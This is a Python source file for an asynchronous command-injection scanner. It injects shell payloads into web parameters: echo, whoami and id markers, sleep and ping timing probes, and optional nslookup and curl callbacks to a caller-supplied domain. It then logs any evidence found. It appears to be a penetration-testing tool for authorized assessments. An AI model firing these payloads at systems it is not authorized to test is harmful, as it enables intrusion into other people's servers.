"""
cmdi.py
------
Command Injection scanner (CMDi).

Features:
- Reflective probes (inject small commands that should produce visible output e.g. `id`, `whoami`, `echo`.
- Time-based blind probes (sleep/delay commands) to detect blind command execution.
- Optional OOB DNS/HTTP callback support (caller should supply a controlled domain) for reliable out-of-band confirmation.
- Uses aiohttp (async), ResponseDiffer for diffing, and EvidenceLogger to record evidence/findings.
- Conservative by default: OOB payloads are *not* used unless provided.

Integration notes:
- EvidenceLogger must implement async methods used here (log_finding or log).
- ResponseDiffer should provide a similarity(a, b) -> float between 0..1.
- evasions.encode.url_safe used to URL-encode/escape payloads for safe inclusion in queries.
- Timeouts are capped to avoid long waits. Aggressive mode enables more expensive timing probes.
"""

import asyncio
import time
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import aiohttp

# Replace these imports with your project's modules.
try:
    from backend.core.evidence import EvidenceLogger
except Exception:  # pragma: no cover - in case example environment lacks the module
    class EvidenceLogger:
        async def log(self, category, url, evidence):  # minimal stub
            pass
        async def log_finding(self, **kwargs):
            pass

try:
    from diffing.responses import ResponseDiffer
except Exception:
    class ResponseDiffer:
        def similarity(self, a: str, b: str) -> float:
            # trivial fallback: exact match -> 1.0 else 0.0
            return 1.0 if a == b else 0.0

try:
    from evasions.encode import url_safe
except Exception:
    from urllib.parse import quote_plus as url_safe  # fallback


# conservative reflective commands (safe, limited output)
REFLECTIVE_CMDS: List[Tuple[str, str]] = [
    # (payload fragment to inject, expected marker seen in output)
    ("; echo CMDI_TEST_12345", "CMDI_TEST_12345"),
    ("`echo CMDI_TEST_12345`", "CMDI_TEST_12345"),
    ("$(echo CMDI_TEST_12345)", "CMDI_TEST_12345"),
    ("; whoami", None),  # if whoami output appears it's a strong sign
    ("; id", None),
]

# time-based probes (sleep variants for common shells)
TIME_PROBES: List[str] = [
    "; sleep 5",               # sh / bash
    "|| sleep 5",              # alternate separators
    "$(sleep 5)",              # subshell
    "; ping -c 5 127.0.0.1",   # older systems may use ping as delay (less reliable)
]

# safe default time threshold (seconds) to consider a timed response suspicious
TIME_THRESHOLD = 4.5

# per-request timeout
REQUEST_TIMEOUT = 12


def _with_param(url: str, key: str, value: str) -> str:
    parsed = urlparse(url)
    q = dict(parse_qsl(parsed.query, keep_blank_values=True))
    q[key] = value
    return urlunparse(parsed._replace(query=urlencode(q, doseq=True)))


class CMDIScanner:
    def __init__(
        self,
        base_url: str,
        session: aiohttp.ClientSession,
        logger: EvidenceLogger,
        differ: Optional[ResponseDiffer] = None,
        aggressive: bool = False,
        timeout: int = REQUEST_TIMEOUT,
    ):
        self.base_url = base_url.rstrip("/")
        self.session = session
        self.logger = logger
        self.differ = differ or ResponseDiffer()
        self.aggressive = aggressive
        self.timeout = timeout

    async def _get(self, url: str, headers: dict = None) -> Tuple[int, str, dict]:
        try:
            timeout = aiohttp.ClientTimeout(total=self.timeout)
            async with self.session.get(url, headers=headers or {}, timeout=timeout) as resp:
                txt = await resp.text(errors="ignore")
                return resp.status, txt, dict(resp.headers)
        except asyncio.TimeoutError:
            return 0, "", {}
        except Exception as e:
            await self._safe_log_error("_get", str(e))
            return 0, "", {}

    async def _post(self, url: str, data: dict, headers: dict = None) -> Tuple[int, str, dict]:
        try:
            timeout = aiohttp.ClientTimeout(total=self.timeout)
            async with self.session.post(url, data=data, headers=headers or {}, timeout=timeout) as resp:
                txt = await resp.text(errors="ignore")
                return resp.status, txt, dict(resp.headers)
        except asyncio.TimeoutError:
            return 0, "", {}
        except Exception as e:
            await self._safe_log_error("_post", str(e))
            return 0, "", {}

    async def _safe_log_error(self, where: str, message: str):
        try:
            await self.logger.log("cmdi_error", {"stage": where, "message": message})
        except Exception:
            # swallow; logging should not crash scanner
            pass

    async def scan_reflective_param(self, url: str, param: str, method: str = "GET", data: Optional[dict] = None) -> List[Dict]:
        """
        Try reflective command injection by appending small echo commands.
        Works by checking for the marker string in response body.
        """
        findings: List[Dict] = []

        # baseline (unmodified)
        if method.upper() == "GET":
            baseline_status, baseline_body, _ = await self._get(url)
        else:
            baseline_status, baseline_body, _ = await self._post(url, data or {})

        for payload_fragment, expected_marker in REFLECTIVE_CMDS:
            # inject into param value
            injected_value = (data.get(param) if data and param in data else None) or ""
            # If param exists in data, we replace; else we put into query
            candidate = injected_value + payload_fragment
            cand_escaped = url_safe(candidate)

            if method.upper() == "GET":
                test_url = _with_param(url, param, cand_escaped)
                status, body, headers = await self._get(test_url)
            else:
                post_data = dict(data or {})
                post_data[param] = candidate
                status, body, headers = await self._post(url, post_data)

            if status == 0:
                continue

            # If expected marker provided, check for its presence
            if expected_marker and expected_marker in body:
                finding = {
                    "type": "command_injection_reflective",
                    "url": url,
                    "param": param,
                    "payload": payload_fragment,
                    "evidence": expected_marker,
                    "status_code": status,
                }
                await self.logger.log_finding(category="CMDi", url=url, evidence=expected_marker, severity="High", meta=finding)
                findings.append(finding)
                # stop on first positive reflective finding for this param
                break

            # Heuristic: if output changed significantly and contains suspicious tokens (uid=, root, CMDI_TEST_ etc.)
            sim = self.differ.similarity(body, baseline_body[:4000] if baseline_body else "")
            suspicious_tokens = ["uid=", "gid=", "root@", "CMDI_TEST", "www-data", "Administrator"]
            if sim < 0.7 and any(tok.lower() in body.lower() for tok in suspicious_tokens):
                finding = {
                    "type": "command_injection_reflective_heuristic",
                    "url": url,
                    "param": param,
                    "payload": payload_fragment,
                    "evidence_snippet": body[:800],
                    "similarity": sim,
                    "status_code": status,
                }
                await self.logger.log_finding(category="CMDi", url=url, evidence="heuristic match", severity="High", meta=finding)
                findings.append(finding)
                break

        return findings

    async def scan_timing_param(self, url: str, param: str, method: str = "GET", data: Optional[dict] = None) -> List[Dict]:
        """
        Send timing-based payloads and measure response times.
        Aggressive mode required for these probes; they intentionally delay responses.
        """
        findings: List[Dict] = []
        if not self.aggressive:
            return findings  # skip timing probes unless explicitly allowed

        # baseline timing
        t0 = time.perf_counter()
        if method.upper() == "GET":
            st_base, body_base, _ = await self._get(url)
        else:
            st_base, body_base, _ = await self._post(url, data or {})
        base_dt = time.perf_counter() - t0

        for probe in TIME_PROBES:
            # craft value similarly to reflective
            injected_value = (data.get(param) if data and param in data else None) or ""
            candidate = injected_value + probe
            cand_escaped = url_safe(candidate)
            start = time.perf_counter()
            if method.upper() == "GET":
                test_url = _with_param(url, param, cand_escaped)
                st, body, _ = await self._get(test_url)
            else:
                post_data = dict(data or {})
                post_data[param] = candidate
                st, body, _ = await self._post(url, post_data)
            elapsed = time.perf_counter() - start

            # if response is significantly slower than baseline -> possible blind cmd injection
            if elapsed - base_dt > TIME_THRESHOLD:
                finding = {
                    "type": "command_injection_timing",
                    "url": url,
                    "param": param,
                    "payload": probe,
                    "baseline_time": base_dt,
                    "observed_time": elapsed,
                    "status_code": st,
                }
                await self.logger.log_finding(category="CMDi", url=url, evidence=f"timing {elapsed:.2f}s", severity="High", meta=finding)
                findings.append(finding)
                # for timing-based, we may continue to attempt other probes or stop depending on policy
                break

        return findings

    async def scan_oob_param(self, url: str, param: str, oob_domain: Optional[str], method: str = "GET", data: Optional[dict] = None) -> List[Dict]:
        """
        OPTIONAL: If caller provides a controlled OOB domain (e.g., <random>.your-oob.com),
        inject payloads that will cause the target to make DNS/HTTP requests to that domain.
        This is the most reliable for blind command injection but must be used carefully and only in
        authorized testing. This function will *not* attempt OOBs if oob_domain is None.
        """
        findings: List[Dict] = []
        if not oob_domain:
            return findings

        # Example simple OOB payloads (in many shells): `nslookup <domain>` or `curl http://<domain>`
        # Caller should set up the OOB server and provide domain unique per test.
        oob_payloads = [
            f"; nslookup {oob_domain}",
            f"; curl http://{oob_domain}/",
            f"`nslookup {oob_domain}`",
            f"$(curl http://{oob_domain}/)",
        ]

        for payload in oob_payloads:
            injected_value = (data.get(param) if data and param in data else None) or ""
            candidate = injected_value + payload
            if method.upper() == "GET":
                test_url = _with_param(url, param, url_safe(candidate))
                st, body, _ = await self._get(test_url)
            else:
                post_data = dict(data or {})
                post_data[param] = candidate
                st, body, _ = await self._post(url, post_data)

            # We can't observe OOB here; caller must check OOB server logs.
            # We still record that an OOB attempt was made so the orchestration can correlate logs.
            finding = {
                "type": "command_injection_oob_attempt",
                "url": url,
                "param": param,
                "payload": payload,
                "status_code": st,
            }
            await self.logger.log_finding(category="CMDi", url=url, evidence="oob_attempt", severity="Info", meta=finding)
            findings.append(finding)

        return findings

    async def scan_params(self, url: str, params: List[str], method: str = "GET", data: Optional[dict] = None, oob_domain: Optional[str] = None) -> List[Dict]:
        """
        High-level helper scanning a set of params using reflective, timing (if allowed), and optional OOB probes.
        Returns aggregated findings.
        """
        all_findings: List[Dict] = []
        for p in params:
            try:
                r1 = await self.scan_reflective_param(url, p, method=method, data=data)
                all_findings.extend(r1)
                r2 = await self.scan_timing_param(url, p, method=method, data=data)
                all_findings.extend(r2)
                r3 = await self.scan_oob_param(url, p, oob_domain, method=method, data=data)
                all_findings.extend(r3)
            except Exception as e:
                await self._safe_log_error("scan_params", f"param={p} error={e}")
                continue
        return all_findings
